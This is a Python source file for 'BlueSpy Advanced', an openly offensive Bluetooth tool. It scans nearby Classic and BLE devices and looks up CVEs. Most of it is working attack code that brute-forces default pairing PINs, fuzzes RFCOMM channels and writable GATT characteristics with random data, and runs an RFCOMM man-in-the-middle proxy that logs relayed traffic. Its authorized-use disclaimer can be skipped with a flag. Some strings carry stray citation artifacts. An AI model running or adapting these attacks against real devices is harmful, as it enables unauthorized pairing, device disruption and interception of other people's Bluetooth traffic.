"""
BlueSpy Advanced - Bluetooth Security Testing Tool
Based on BlueSpy (TarlogicSecurity) with extended features.
"""

import sys
import os
import platform
import argparse
import json
import asyncio
import time
import random
import logging
import select

try:
    import bluetooth  
except ImportError:
    bluetooth = None
try:
    from bleak import BleakScanner, BleakClient, BleakError
except ImportError:
    BleakScanner = None
    BleakClient = None
    BleakError = Exception  

try:
    import requests
except ImportError:
    requests = None

logging.basicConfig(level=logging.INFO, format="[*] %(message)s")

DISCLAIMER = (
    "****************************************************************\n"
    "* WARNING: Authorized Use Only                                 *\n"
    "* This tool is intended for ethical hacking and security testing on devices you own or have permission to test. *\n"
    "* Unauthorized use is illegal and unethical.                   *\n"
    "* Use at your own risk. The developers assume no liability.    *\n"
    "****************************************************************"
)

class DeviceInfo:
    def __init__(self, address, name=None, dev_type="classic", device_class=None, rssi=None):
        self.address = address
        self.name = name if name else "Unknown"
        self.type = dev_type  
        self.device_class = device_class  
        self.rssi = rssi  
        self.services = []  
        self.issues = []    

    def to_dict(self):
        """Convert device info to dictionary for reporting."""
        data = {
            "address": self.address,
            "name": self.name,
            "type": self.type
        }
        if self.device_class is not None:
            data["class"] = hex(self.device_class)
        if self.rssi is not None:
            data["rssi"] = self.rssi
        if self.services:
            data["services"] = self.services
        if self.issues:
            data["issues"] = self.issues
        return data

async def scan_devices(duration=8):
    """Scan for both Classic Bluetooth and BLE devices."""
    ble_devices = []
    classic_devices = []

    if BleakScanner:
        try:
            ble_devices = await BleakScanner.discover(timeout=duration)
        except Exception as e:
            logging.error(f"BLE scan error: {e}")
            ble_devices = []

    if bluetooth:
        try:

            classic_devices = await asyncio.get_running_loop().run_in_executor(
                None, bluetooth.discover_devices, duration, True, True, True
            )
        except Exception as e:
            logging.error(f"Classic Bluetooth scan error: {e}")
            classic_devices = []

    devices = []
    seen = set()

    for dev in classic_devices:
        if isinstance(dev, tuple) and len(dev) >= 3:
            addr, name, dev_class = dev[0], dev[1], dev[2]
        elif isinstance(dev, tuple) and len(dev) == 2:
            addr, name = dev[0], dev[1]
            dev_class = None
        else:
            addr = dev
            name = None
            dev_class = None
        if addr in seen:
            continue
        seen.add(addr)
        device = DeviceInfo(addr, name, dev_type="classic", device_class=dev_class)
        devices.append(device)

    for d in ble_devices:
        addr = getattr(d, "address", None) or str(d)
        name = getattr(d, "name", None)
        rssi = getattr(d, "rssi", None)
        if addr in seen:

            continue
        seen.add(addr)
        device = DeviceInfo(addr, name, dev_type="ble", device_class=None, rssi=rssi)
        devices.append(device)
    return devices

def scan_single_classic(addr, timeout=5):
    """Helper to perform a lookup for a single classic device's name and class."""
    name = None
    dev_class = None
    if bluetooth:
        try:
            name = bluetooth.lookup_name(addr, timeout=timeout)

        except Exception as e:
            logging.error(f"Error looking up name for {addr}: {e}")
    return name, dev_class

async def scan_single_ble(addr, timeout=5):
    """Helper to scan for a specific BLE device address (to get name/RSSI)."""
    name = None
    rssi = None
    if BleakScanner:
        try:
            devices = await BleakScanner.discover(timeout=timeout)
            for d in devices:
                if d.address.lower() == addr.lower():
                    name = d.name
                    rssi = d.rssi
                    break
        except Exception as e:
            logging.error(f"Error scanning for BLE device {addr}: {e}")
    return name, rssi

def enumerate_services_classic(device):
    """Discover Classic Bluetooth services (SDP records) on the device."""
    if not bluetooth:
        return []
    services = []
    try:
        serv_list = bluetooth.find_service(address=device.address)
        for svc in serv_list:
            svc_name = svc.get("name") or svc.get("service-id") or "Unknown Service"

            if "port" in svc:
                svc_name += f" (RFCOMM channel {svc['port']})"
            elif "protocol" in svc:
                svc_name += f" (protocol {svc['protocol']})"
            services.append(svc_name)
        device.services = services
    except Exception as e:
        logging.error(f"Error enumerating services on {device.address}: {e}")
    return services

async def enumerate_services_ble(device):
    """Discover BLE GATT services on the device by connecting to it."""
    if not BleakClient:
        return []
    services_list = []
    try:
        client = BleakClient(device.address)
        await client.connect()
        svcs = await client.get_services()
        for svc in svcs:
            services_list.append(str(svc.uuid))
        device.services = services_list
        await client.disconnect()
    except Exception as e:
        logging.error(f"Could not enumerate BLE services on {device.address}: {e}")
    return services_list

def lookup_vulnerabilities(device):
    """Check device against known vulnerabilities or CVE database."""
    vulns = []

    if device.type == "classic":

        if device.device_class:
            major_class = (device.device_class >> 8) & 0xF
        else:
            major_class = None
        if major_class == 0x4 or (device.name and "headset" in device.name.lower()):
            vulns.append("Possible default PIN (e.g., '0000' for headsets)")

        if device.name and any(keyword in device.name.lower() for keyword in ["hc-05", "hc05", "hc 05"]):
            vulns.append("Device uses legacy BT module (potential known vulnerabilities)")
    if device.type == "ble":

        if device.name and "mi band" in device.name.lower():
            vulns.append("Known vulnerability in older Mi Band (pairing bypass)")

    if requests:
        try:
            query = device.name if device.name and device.name != "Unknown" else device.address
            url = f"https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch={query}"
            resp = requests.get(url, timeout=5)
            if resp.status_code == 200:
                data = resp.json()
                found = 0
                for item in data.get("vulnerabilities", []):
                    cve_id = item.get("cve", {}).get("id")
                    desc_entries = item.get("cve", {}).get("descriptions", [])
                    desc_text = desc_entries[0]["text"] if desc_entries else ""
                    if cve_id:

                        if "bluetooth" in desc_text.lower() or "bluetooth" in query.lower():
                            short_desc = desc_text[:100] + "..." if len(desc_text) > 100 else desc_text
                            vulns.append(f"{cve_id}: {short_desc}")
                            found += 1
                    if found >= 3:  
                        break
        except Exception as e:
            logging.error(f"Error querying CVE database for {device.address}: {e}")

    for v in vulns:
        if v not in device.issues:
            device.issues.append(v)
    return vulns

async def attempt_pairing_attack(device):
    """Attempt to exploit weak pairing (JustWorks, default PIN) on the device."""
    if device.type == "classic":
        default_pins = ["0000", "1234", "1111", "9999"]
        pin_success = None
        if bluetooth:
            for pin in default_pins:
                try:
                    if platform.system() == "Linux":

                        process = os.popen(f"bluetoothctl pair {device.address}")
                        time.sleep(1)
                        process.write(f"{pin}\n")
                        time.sleep(3)
                        output = process.read()
                        process.close()
                        if "Pairing successful" in output or "Connection successful" in output:
                            pin_success = pin
                            break
                    else:

                        sock = bluetooth.BluetoothSocket(bluetooth.RFCOMM)
                        sock.connect((device.address, 1))
                        sock.close()
                        pin_success = "(OS default pairing used)"
                        break
                except Exception:
                    continue
        if pin_success:
            device.issues.append(f"Paired with default PIN {pin_success}")
        else:
            device.issues.append("No default PIN succeeded (secure pairing likely required)")
    elif device.type == "ble":
        if BleakClient:
            try:
                client = BleakClient(device.address)
                await client.connect()
                if client.is_connected:
                    device.issues.append("Connected without bonding (JustWorks - no authentication)")
                await client.disconnect()
            except Exception:
                device.issues.append("BLE pairing required (could not connect without bonding)")

    if device.type == "ble" and any("JustWorks" in issue for issue in device.issues):
        device.issues.append("BLE JustWorks pairing allows MITM if attacker intercepts connection&#8203;:contentReference[oaicite:15]{index=15}")

def fuzz_classic(device):
    """Fuzz classic Bluetooth services by sending random data to open RFCOMM channels."""
    if not bluetooth:
        return
    try:
        services = bluetooth.find_service(address=device.address)
        if not services:
            logging.info(f"No services found on {device.address} to fuzz.")
            return
        for svc in services:
            host = svc.get("host")
            port = svc.get("port")
            name = svc.get("name") or "UnknownService"
            proto = svc.get("protocol")

            if port is not None and proto == "RFCOMM":
                try:
                    sock = bluetooth.BluetoothSocket(bluetooth.RFCOMM)
                    sock.connect((host, port))
                    logging.info(f"Fuzzing {name} on {host}:{port}")
                    for _ in range(5):
                        data = bytes(random.getrandbits(8) for _ in range(32))
                        sock.send(data)
                        time.sleep(0.1)
                    sock.close()
                except Exception as e:
                    logging.error(f"Error fuzzing service {name} on {device.address}: {e}")
    except Exception as e:
        logging.error(f"Service discovery or fuzzing failed for {device.address}: {e}")

async def fuzz_ble(device):
    """Fuzz BLE GATT services by writing random data to writable characteristics."""
    if not BleakClient:
        return
    try:
        client = BleakClient(device.address)
        await client.connect()
        svcs = await client.get_services()
        logging.info(f"Fuzzing BLE services on {device.address}")
        for service in svcs:
            for char in service.characteristics:
                if "write" in char.properties or "write-without-response" in char.properties:
                    for size in [1, 2, 8, 16, 64, 128]:
                        data = bytes(random.getrandbits(8) for _ in range(size))
                        try:
                            await client.write_gatt_char(char.uuid, data, response= "write-without-response" not in char.properties)
                            logging.info(f"  Wrote {size} bytes to {char.uuid}")
                        except BleakError as e:
                            logging.info(f"  Write of {size} bytes to {char.uuid} caused error: {e}")
                        except Exception as e:
                            logging.info(f"  Exception during fuzzing char {char.uuid}: {e}")
        await client.disconnect()
    except Exception as e:
        logging.error(f"BLE fuzzing failed for {device.address}: {e}")

def mitm_proxy(target_addr, channel=1):
    """Set up a man-in-the-middle proxy for an RFCOMM service on the target device."""
    if not bluetooth:
        logging.error("Bluetooth library not available, cannot run MITM proxy.")
        return

    try:
        target_sock = bluetooth.BluetoothSocket(bluetooth.RFCOMM)
        target_sock.connect((target_addr, channel))
        logging.info(f"Connected to target {target_addr} on RFCOMM channel {channel}")
    except Exception as e:
        logging.error(f"Failed to connect to target {target_addr} on channel {channel}: {e}")
        return

    try:
        server_sock = bluetooth.BluetoothSocket(bluetooth.RFCOMM)
        server_sock.bind(("", channel))
        server_sock.listen(1)
    except Exception as e:
        logging.error(f"Failed to bind local RFCOMM server on channel {channel}: {e}")
        target_sock.close()
        return
    logging.info(f"MITM proxy listening on RFCOMM channel {channel}, waiting for a client...")
    client_sock, client_info = server_sock.accept()
    logging.info(f"Client connected from {client_info}")
    client_sock.setblocking(False)
    target_sock.setblocking(False)
    try:
        while True:
            readable, _, _ = select.select([client_sock, target_sock], [], [])
            if client_sock in readable:
                data = client_sock.recv(1024)
                if not data:
                    break
                logging.info(f"[Client -> Target] {data}")
                target_sock.send(data)
            if target_sock in readable:
                data = target_sock.recv(1024)
                if not data:
                    break
                logging.info(f"[Target -> Client] {data}")
                client_sock.send(data)
    except Exception as e:
        logging.error(f"MITM proxy error: {e}")
    finally:
        client_sock.close()
        target_sock.close()
        server_sock.close()
        logging.info("MITM proxy terminated.")

def generate_report(devices, format='json'):
    """Generate a report from devices list in JSON or HTML format."""
    if format == 'json':
        return json.dumps([dev.to_dict() for dev in devices], indent=2)
    elif format == 'html':
        html = ["<html><head><title>Bluetooth Scan Report</title></head><body>"]
        html.append("<h1>Bluetooth Scan Report</h1>")
        html.append("<table border='1'><tr><th>Address</th><th>Name</th><th>Type</th><th>Class</th><th>RSSI</th><th>Services</th><th>Issues</th></tr>")
        for dev in devices:
            info = dev.to_dict()
            html.append("<tr>")
            html.append(f"<td>{info.get('address','')}</td>")
            html.append(f"<td>{info.get('name','')}</td>")
            html.append(f"<td>{info.get('type','')}</td>")
            html.append(f"<td>{info.get('class','')}</td>")
            html.append(f"<td>{info.get('rssi','')}</td>")
            services = ", ".join(info.get('services', []))
            issues = "; ".join(info.get('issues', []))
            html.append(f"<td>{services}</td>")
            html.append(f"<td>{issues}</td>")
            html.append("</tr>")
        html.append("</table></body></html>")
        return "\n".join(html)
    else:
        logging.error(f"Unsupported report format: {format}")
        return ""

async def run_tool(args):
    devices = []
    target_device = None

    if args.scan:
        logging.info("Scanning for Bluetooth devices...")
        devices = await scan_devices(duration=args.scan_time)
        logging.info(f"Discovered {len(devices)} device(s).")
        for idx, dev in enumerate(devices, start=1):
            dev_info = f"{dev.address} - {dev.name} ({dev.type.upper()})"
            if dev.device_class:
                dev_info += f" Class: {hex(dev.device_class)}"
            if dev.rssi is not None:
                dev_info += f" RSSI: {dev.rssi}"
            logging.info(f" [{idx}] {dev_info}")

    if args.target:
        targ_addr = args.target
        for dev in devices:
            if dev.address.lower() == targ_addr.lower():
                target_device = dev
                break
        if not target_device:
            dev_name = None
            dev_class = None
            dev_type = "classic"
            name, dev_class = scan_single_classic(targ_addr)
            if name:
                dev_name = name
                dev_type = "classic"
            else:
                ble_name, ble_rssi = await scan_single_ble(targ_addr)
                if ble_name or ble_rssi is not None:
                    dev_name = ble_name
                    dev_type = "ble"
                else:
                    dev_name = "Unknown"
                    dev_type = "ble"
            target_device = DeviceInfo(targ_addr, dev_name, dev_type, device_class=dev_class)
            devices.append(target_device)
        logging.info(f"Target device set: {target_device.address} - {target_device.name} ({target_device.type.upper()})")

    if args.cve:
        if target_device:
            logging.info(f"Checking {target_device.address} for known vulnerabilities...")
            lookup_vulnerabilities(target_device)
        else:
            logging.info("Checking all discovered devices against vulnerability database...")
            for dev in devices:
                lookup_vulnerabilities(dev)

    if args.pair and target_device:
        logging.info(f"Attempting pairing attacks on {target_device.address} ...")
        await attempt_pairing_attack(target_device)

    if args.fuzz and target_device:
        logging.info(f"Fuzzing device {target_device.address} ...")
        if target_device.type == "classic":
            enumerate_services_classic(target_device)
            await asyncio.get_running_loop().run_in_executor(None, fuzz_classic, target_device)
        elif target_device.type == "ble":
            await enumerate_services_ble(target_device)
            await fuzz_ble(target_device)
        logging.info("Fuzzing completed.")

    if args.mitm and target_device:
        if target_device.type == "classic":
            logging.info("Launching MITM proxy - ensure a second device connects to this machine as the client.")
            if not target_device.services:
                enumerate_services_classic(target_device)
            mitm_channel = 1
            for svc in target_device.services:
                if "(RFCOMM channel" in svc:
                    try:
                        ch = int(svc.split("RFCOMM channel")[1].strip().strip(")"))
                        mitm_channel = ch
                        break
                    except:
                        continue
            await asyncio.get_running_loop().run_in_executor(None, mitm_proxy, target_device.address, mitm_channel)
        else:
            logging.info("MITM for BLE is not implemented in this tool (requires specialized techniques&#8203;:contentReference[oaicite:16]{index=16}).")

    if args.json:
        report_data = generate_report(devices, format='json')
        try:
            with open(args.json, 'w') as f:
                f.write(report_data)
            logging.info(f"JSON report saved to {args.json}")
        except Exception as e:
            logging.error(f"Failed to save JSON report: {e}")
    if args.html:
        report_html = generate_report(devices, format='html')
        try:
            with open(args.html, 'w') as f:
                f.write(report_html)
            logging.info(f"HTML report saved to {args.html}")
        except Exception as e:
            logging.error(f"Failed to save HTML report: {e}")

    if not args.json and not args.html:
        logging.info("Scan and test results:")
        for dev in devices:
            info = f"{dev.address} - {dev.name} ({dev.type.upper()})"
            if dev.issues:
                info += " | Issues: " + "; ".join(dev.issues)
            logging.info(info)

def run_script_file(script_path):
    """Simple scripting engine to run multiple commands from a file."""
    try:
        with open(script_path, 'r') as f:
            lines = f.readlines()
    except Exception as e:
        logging.error(f"Failed to open script file: {e}")
        return
    current_target = None
    devices = []
    for line in lines:
        line = line.strip()
        if not line or line.startswith('#'):
            continue
        parts = line.split()
        cmd = parts[0].lower()
        if cmd == "scan":
            duration = int(parts[1]) if len(parts) > 1 else 8
            logging.info(f"[Script] Scanning for devices (duration={duration})")
            devices = asyncio.run(scan_devices(duration))
            logging.info(f"[Script] Found {len(devices)} devices.")
        elif cmd == "target":
            if len(parts) < 2:
                logging.error("[Script] TARGET command requires a device address.")
                continue
            addr = parts[1]
            current_target = None
            for dev in devices:
                if dev.address.lower() == addr.lower():
                    current_target = dev
                    break
            if not current_target:
                name, dev_class = scan_single_classic(addr)
                dev_type = "classic" if name else "ble"
                if not name:
                    ble_name, ble_rssi = asyncio.run(scan_single_ble(addr))
                    if ble_name or ble_rssi is not None:
                        name = ble_name
                        dev_type = "ble"
                name = name or "Unknown"
                current_target = DeviceInfo(addr, name, dev_type, device_class=dev_class)
                devices.append(current_target)
            logging.info(f"[Script] Target set to {current_target.address} ({current_target.name})")
        elif cmd == "cve":
            if current_target:
                logging.info(f"[Script] Checking target {current_target.address} for CVEs")
                lookup_vulnerabilities(current_target)
            else:
                logging.info("[Script] Checking all devices for CVEs")
                for dev in devices:
                    lookup_vulnerabilities(dev)
        elif cmd == "pair":
            if not current_target:
                logging.error("[Script] No target set for PAIR command.")
            else:
                logging.info(f"[Script] Attempting pairing attack on {current_target.address}")
                asyncio.run(attempt_pairing_attack(current_target))
        elif cmd == "fuzz":
            if not current_target:
                logging.error("[Script] No target set for FUZZ command.")
            else:
                logging.info(f"[Script] Fuzzing target {current_target.address}")
                if current_target.type == "classic":
                    enumerate_services_classic(current_target)
                    fuzz_classic(current_target)
                elif current_target.type == "ble":
                    asyncio.run(enumerate_services_ble(current_target))
                    asyncio.run(fuzz_ble(current_target))
        elif cmd == "mitm":
            if not current_target:
                logging.error("[Script] No target set for MITM command.")
            else:
                if current_target.type == "classic":
                    logging.info(f"[Script] Starting MITM proxy for {current_target.address}")
                    if not current_target.services:
                        enumerate_services_classic(current_target)
                    mitm_chan = 1
                    for svc in current_target.services:
                        if "(RFCOMM channel" in svc:
                            try:
                                ch = int(svc.split("RFCOMM channel")[1].strip().strip(")"))
                                mitm_chan = ch
                                break
                            except:
                                continue
                    mitm_proxy(current_target.address, mitm_chan)
                else:
                    logging.info("[Script] BLE MITM not supported in script.")
        elif cmd == "report":
            if len(parts) < 3:
                logging.error("[Script] REPORT command requires format and filename.")
            else:
                fmt = parts[1].lower()
                filename = parts[2]
                data = ""
                if fmt == "json":
                    data = generate_report(devices, format='json')
                elif fmt == "html":
                    data = generate_report(devices, format='html')
                else:
                    logging.error(f"[Script] Unknown report format: {fmt}")
                    continue
                try:
                    with open(filename, 'w') as f:
                        f.write(data)
                    logging.info(f"[Script] Report saved to {filename}")
                except Exception as e:
                    logging.error(f"[Script] Failed to save report: {e}")
        else:
            logging.error(f"[Script] Unknown command: {parts[0]}")

def main():
    parser = argparse.ArgumentParser(description="BlueSpy Advanced Bluetooth Security Tool")
    parser.add_argument("--scan", "-s", action="store_true", help="Scan for nearby Bluetooth devices")
    parser.add_argument("--scan-time", type=int, default=8, help="Duration for scanning in seconds (default 8)")
    parser.add_argument("--target", "-t", metavar="ADDR", help="Target device Bluetooth address (MAC)")
    parser.add_argument("--cve", action="store_true", help="Check devices against known CVEs/vulnerabilities")
    parser.add_argument("--pair", action="store_true", help="Attempt pairing attacks on the target device")
    parser.add_argument("--fuzz", action="store_true", help="Fuzz the target device's services")
    parser.add_argument("--mitm", action="store_true", help="Perform a MITM proxy attack (Classic BT only)")
    parser.add_argument("--script", metavar="FILE", help="Run commands from a script file")
    parser.add_argument("--json", metavar="FILE", help="Save results to a JSON report file")
    parser.add_argument("--html", metavar="FILE", help="Save results to an HTML report file")
    parser.add_argument("--no-prompt", action="store_true", help="Disable confirmation prompt for authorized use")
    args = parser.parse_args()

    if not args.no_prompt:
        print(DISCLAIMER)
        proceed = input("Proceed with authorized testing? (y/N): ").strip().lower()
        if proceed != 'y':
            print("Exiting tool.")
            sys.exit(0)

    if not bluetooth and not BleakScanner:
        logging.error("No Bluetooth libraries available. Install PyBluez for Classic BT and/or Bleak for BLE.")
        sys.exit(1)

    if args.script:
        run_script_file(args.script)
        sys.exit(0)

    asyncio.run(run_tool(args))

if __name__ == "__main__":
    main()
